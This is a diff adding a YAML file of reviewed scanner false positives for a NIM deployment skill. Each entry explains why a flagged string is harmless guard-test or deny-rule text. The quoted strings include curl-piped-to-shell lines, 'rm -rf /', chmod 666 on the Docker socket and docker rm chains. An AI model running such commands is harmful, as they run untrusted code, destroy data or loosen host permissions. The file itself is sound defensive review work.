@@ -1,0 +1,302 @@
+# Reviewed false positives for nim-skills PR #5 at commit
+# 3f50725bb5bacfc20cb79a512b56f6293b0ddda5, using SkillSpector 2.13.5.
+# Each rule scopes one rule ID, exact skill-relative file, and matched text.
+# Glob metacharacters in matched text are escaped for literal matching.
+# These rules do not bind file hashes: re-review when the named files change.
+# Other findings and incomplete evaluations remain active.
+version: 2
+rules:
+- id: AS1
+  path: references/hook.md
+  message: ~/.claude/settings.json
+  reason: >-
+    Reviewed 2026-11-24: The installation table tells the user where to put their own guard
+    hook. The preceding instruction explicitly forbids the skill from editing user-level settings
+    and requires showing the snippet to the user.
+- id: PE3
+  path: references/hook.md
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: The always-denied table lists kubeconfig and KUBECONFIG changes as
+    forbidden. It documents the guard refusing changes, rather than instructing credential access.
+- id: PE3
+  path: scripts/guard-rules.json
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: These deny-rule reasons prohibit changing kubeconfig or explain how
+    to avoid its implicit namespace. They require explicit approved context and namespace flags,
+    without reading or exporting credentials.
+- id: PE3
+  path: scripts/guard.py
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: The module docstring describes kubeconfig changes among the always-blocked
+    operations. It does not read or export a Kubernetes credential file.
+- id: PE3
+  path: tests/test_guard.py
+  message: kubeconfig
+  reason: >-
+    Reviewed 2026-11-24: Negative guard cases pass a kubeconfig override or KUBECONFIG assignment
+    as command text and assert deny. The evaluate path parses these strings without running
+    kubectl or opening credentials.
+- id: SC2
+  path: references/hook.md
+  message: curl ... \| sh
+  reason: >-
+    Reviewed 2026-11-24: The always-denied table lists curl piped to a shell as forbidden. This
+    is a description of the guard refusal, not a download-and-execute instruction.
+- id: PE4
+  path: scripts/guard-rules.json
+  message: /var/run/docker.sock
+  reason: >-
+    Reviewed 2026-11-24: The docker-sock-chmod deny rule rejects chmod or chown of the Docker
+    socket. Naming the protected socket in the rejection reason does not grant access or loosen
+    permissions.
+- id: PE4
+  path: scripts/runners/nimcli.py
+  message: /var/run/docker.sock
+  reason: >-
+    Reviewed 2026-11-24: The nim-diag-fix deny rule rejects nim diag --fix because it could
+    loosen Docker socket permissions and restart Docker. Its fix requires read-only nim diag
+    without --fix.
+- id: PE4
+  path: tests/test_guard.py
+  message: /var/run/docker.sock
+  reason: >-
+    Reviewed 2026-11-24: Negative guard cases pass Docker socket chmod/chown commands as text
+    and assert the docker-sock-chmod deny rule. The commands are evaluated by the guard, not
+    executed.
+- id: SC2
+  path: scripts/guard.py
+  message: curl | sh
+  reason: >-
+    Reviewed 2026-11-24: The module docstring describes curl piped to a shell among always-blocked
+    operations. It does not fetch or execute a script.
+- id: TM1
+  path: scripts/runners/nimcli.py
+  message: chmod 666
+  reason: >-
+    Reviewed 2026-11-24: chmod 666 appears in the nim-diag-fix rejection reason explaining why
+    nim diag --fix is denied. The guard requires read-only nim diag without --fix instead.
+- id: TM1
+  path: tests/test_guard.py
+  message: chmod 666
+  reason: >-
+    Reviewed 2026-11-24: The chmod 666 command is a negative test input that must return deny
+    with docker-sock-chmod. It never executes the chmod command.
+- id: E2
+  path: tests/test_approvals.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: E2
+  path: tests/test_defaults.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: E2
+  path: tests/test_docs_check.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: E2
+  path: tests/test_guard.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: E2
+  path: tests/test_nextstep.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: E2
+  path: tests/test_nimdeploy.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: E2
+  path: tests/test_port_resolution.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: E2
+  path: tests/test_render_docker.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: E2
+  path: tests/test_render_k8s.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: E2
+  path: tests/test_review_fixes.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: E2
+  path: tests/test_runner_nimcli.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: SC2
+  path: tests/test_guard.py
+  message: curl -fsSL https://x.sh | sh
+  reason: >-
+    Reviewed 2026-11-24: Guard tests treat curl command strings as parser inputs. Shell-pipe
+    cases assert deny; the localhost /v1/models case asserts a read-only command is allowed.
+    No command string is executed or downloaded content evaluated.
+- id: SC2
+  path: tests/test_guard.py
+  message: curl https://x | sudo bash
+  reason: >-
+    Reviewed 2026-11-24: Guard tests treat curl command strings as parser inputs. Shell-pipe
+    cases assert deny; the localhost /v1/models case asserts a read-only command is allowed.
+    No command string is executed or downloaded content evaluated.
+- id: TM2
+  path: tests/test_guard.py
+  message: '| sudo '
+  reason: >-
+    Reviewed 2026-11-24: Chained shell commands are negative guard inputs. The curl/sudo and
+    xargs removal cases assert deny through decide; neither chain is executed.
+- id: SC2
+  path: tests/test_guard.py
+  message: |-
+    curl -s http://localhost:8000/v1/models",
+        ],
+    )
+    def test_read_only_and_dry_run_commands_pass(command: str) -> None:
+        assert decide(command)[[]0] == "allow"
+
+
+    @pytest.mark.parametrize(
+        "command
+  reason: >-
+    Reviewed 2026-11-24: Guard tests treat curl command strings as parser inputs. Shell-pipe
+    cases assert deny; the localhost /v1/models case asserts a read-only command is allowed.
+    No command string is executed or downloaded content evaluated.
+- id: TM2
+  path: tests/test_guard.py
+  message: '| xargs docker rm'
+  reason: >-
+    Reviewed 2026-11-24: Chained shell commands are negative guard inputs. The curl/sudo and
+    xargs removal cases assert deny through decide; neither chain is executed.
+- id: TT1
+  path: tests/test_guard.py
+  message: path.write_text(path.read_text() + "# edited\n")
+  reason: >-
+    Reviewed 2026-11-24: test_a_changed_approved_file_is_denied edits a temporary rendered artifact
+    after approval, then asserts the guard rejects it as changed after approval. The edit tests
+    tamper detection rather than bypassing it.
+- id: TM1
+  path: tests/test_hook_fail_closed.py
+  message: rm -rf /
+  reason: >-
+    Reviewed 2026-11-24: rm -rf / is JSON command text for a simulated Read tool event. The
+    hook test verifies non-Bash tools are ignored; run_documented executes the guard hook, never
+    the payload command.
+- id: TM1
+  path: tests/test_hook_fail_closed.py
+  message: rm -rf /",
+  reason: >-
+    Reviewed 2026-11-24: rm -rf / is JSON command text for a simulated Read tool event. The
+    hook test verifies non-Bash tools are ignored; run_documented executes the guard hook, never
+    the payload command.
+- id: E2
+  path: tests/test_install_locations.py
+  message: os.environ.items()
+  reason: >-
+    Reviewed 2026-11-24: The installation fixture copies the environment while removing inherited
+    skill-home/project overrides, then installs offline fake Docker and skopeo on PATH. It tests
+    local install paths without logging or exporting environment values.
+- id: E2
+  path: tests/test_nimdeploy.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(tmp_path / "home")}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: TM2
+  path: tests/test_runner_nimcli.py
+  message: '| xargs -r docker rm'
+  reason: >-
+    Reviewed 2026-11-24: The blanket-stop negative test passes this xargs removal chain to guard.evaluate
+    and asserts deny with docker-blanket-stop. The chain is not executed.
+- id: TM1
+  path: tests/test_runner_nimcli.py
+  message: rm other/model
+  reason: >-
+    Reviewed 2026-11-24: The stop-or-rm negative test passes named removal commands to guard.evaluate
+    without approval and asserts deny with nim-stop-rm. No container removal runs.
+- id: E2
+  path: tests/test_runners.py
+  message: '{[*][*]os.environ, [*][*]FAKE_ENV, "NIM_DEPLOY_HOME": str(nd.runs_root())}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: TM2
+  path: tests/test_shellparse.py
+  message: '| xargs -n1 docker rm'
+  reason: >-
+    Reviewed 2026-11-24: test_xargs_is_recorded_as_a_wrapper parses the command string and checks
+    the xargs wrapper and normalized docker rm tokens. It does not execute a shell or remove
+    containers.
+- id: E2
+  path: tests/test_validate.py
+  message: '{[*][*]os.environ, "NIM_DEPLOY_HOME": str(tmp_path / "h")}'
+  reason: >-
+    Reviewed 2026-11-24: The test inherits the local environment for subprocess execution and
+    redirects NIM_DEPLOY_HOME to a temporary test store. The test helpers run local skill scripts
+    with offline or fake Docker tools; the environment expression is not logged or sent to an
+    external endpoint.
+- id: TM2
+  path: scripts/runners/docker.py
+  message: '&& sudo'
+  reason: >-
+    Reviewed 2026-11-24: The matched text is the fix hint for the no_nvidia_runtime error. It is
+    returned to the user as a string ("Ask the user to install the NVIDIA Container Toolkit and
+    run: ...") and the skill never executes it. The user runs the privileged commands themselves.
+- id: TM2
+  path: scripts/log-triage.json
+  message: '&& sudo'
+  reason: >-
+    Reviewed 2026-11-24: The matched text is the fix field of the no-gpu triage entry. It is
+    advice shown to the user ("Ask the user to install the NVIDIA Container Toolkit and run: ...")
+    and the skill never executes it. The user runs the privileged commands themselves.
+fingerprints: []
